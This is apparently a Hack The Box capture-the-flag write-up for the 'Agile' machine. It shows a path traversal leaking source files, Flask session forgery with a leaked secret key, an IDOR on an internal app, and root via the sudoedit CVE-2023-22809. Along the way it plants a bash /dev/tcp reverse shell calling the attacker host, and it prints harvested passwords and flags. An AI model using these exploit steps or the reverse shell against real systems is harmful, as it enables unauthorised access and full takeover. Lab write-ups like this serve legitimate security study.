# [Agile](https://app.hackthebox.com/machines/532)

## Overview

- Linux machine
- Medium

## ip

target: 10.129.74.18

attacker: 10.10.14.5

## Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -Pn -v 10.129.74.18 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web vulnerability: path traversal => source code

endpoint: `/download`

poc:

```http
GET /download?fn=../etc/passwd HTTP/1.1

HTTP/1.1 200 OK

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

error message when set fn to not exist file name:

```http
GET /download?fn=../asdf HTTP/1.1

HTTP/1.1 500 INTERNAL SERVER ERROR
Server: nginx/1.18.0 (Ubuntu)

...
```

from error messages =>:

- python 3.10
- flask
- source: `/app/app/superpass/app.py`

i write a script to download all source code via path traversal start with `/app/app/superpass/app.py`: [script here](./leak_source.py)

=> [superpass source](./superpass/)

## Source code review: CWE-200 => corum account => user flag

secret key in [`app.py`](./superpass/app.py):

```python
app.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'
```

use `flask-unsign` to access user_id 2 account

```bash
┌──(flask-unsign)─(kali㉿kali)-[~/Documents/learn-python/env]
└─$ flask-unsign --sign --cookie "{'_fresh': False, '_user_id': '2'}" --secret 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD' --legacy
eyJfZnJlc2giOmZhbHNlLCJfdXNlcl9pZCI6IjIifQ.ZAYgpQ.Yc23uzKwGITcEOVYov-OfH7TaWk
```

```http
GET /vault HTTP/1.1
Cookie: session=eyJfZnJlc2giOmZhbHNlLCJfdXNlcl9pZCI6IjIifQ.ZAYifw.T4FusYDXe_07KuxBjxxEMEw1zL4

HTTP/1.1 200 OK

...
    <td>agile</td>
    <td>corum</td>
    <td>5db7caa1d13cc37c9fc2</td>
...
```

ssh login:

```bash
└─$ ssh corum@10.129.74.18
corum@agile:~$ cat user.txt
2461cb94b04ee17a17dab1a87e0a1804
```

## Local testing app vulnerability: IDOR => edwards account

found another web server is running on port 5555:

- `ss -tulpn | grep LISTEN`

  ```bash
  corum@agile:~$ ss -tulpn | grep LISTEN
  tcp   LISTEN 0      5          127.0.0.1:54595      0.0.0.0:*          
  tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
  tcp   LISTEN 0      10         127.0.0.1:41829      0.0.0.0:*          
  tcp   LISTEN 0      2048       127.0.0.1:5000       0.0.0.0:*          
  tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
  tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
  tcp   LISTEN 0      2048       127.0.0.1:5555       0.0.0.0:*          
  tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
  tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
  tcp   LISTEN 0      5              [::1]:54595         [::]:*          
  tcp   LISTEN 0      128             [::]:22            [::]:*   
  ```

  ```bash
  curl http:127.0.0.1:5555

  => web page
  ```

local port forwarding to access web server from attacker machine:

```bash
└─$ ssh -L 2222:127.0.0.1:5555 corum@10.129.74.18

enter corum password
```

=> now we can access local web server from attacker machine at `127.0.0.1:2222`

Local web server vulnerabilities:

- no more path traversal
- but i found another vulnerablities: IDOR

```bash
GET /vault/row/1 HTTP/1.1
Host: localhost:2222

HTTP/1.1 200 OK

agile edwards d07867c6267dcb5df0af
```

## edwards account => privilege escalation: CVE-2023-22809 => root flag

```bash
edwards@agile:~$ sudo -l
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

sudoedit vulnerability: [sudo-CVE-2023-22809](./documents/sudo-CVE-2023-22809.pdf)

=> can read and edit any file that `dev_admin` can.

file `test_and_update.sh` will be run by root

```bash
edwards@agile:/app$ cat test_and_update.sh 
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

```bash
edwards@agile:/app$ ls -l /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 Mar  7 02:36 /app/venv/bin/activate
```

use `CVE-2023-22809` to edit `/app/venv/bin/activate`:

```bash
edwards@agile:/app$ export EDITOR="vim -- /app/venv/bin/activate"
edwards@agile:/app$ sudo -u dev_admin sudoedit /app/config_test.json
```

=> vim open `/app/venv/bin/activate`, add

```bash
bash -i >& /dev/tcp/10.10.14.5/4242 0>&1
```

to the top of the file, start nc listening and wait:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.5] from superpass.htb [10.129.74.18] 50928
bash: cannot set terminal process group (46075): Inappropriate ioctl for device
bash: no job control in this shell
bash: connect: Connection refused
bash: /dev/tcp/10.10.14.5/4242: Connection refused
root@agile:~# cat /root/root.txt
cat /root/root.txt
91fbc35526e9013e0fd09dda2314cbbf
root@agile:~# 
```
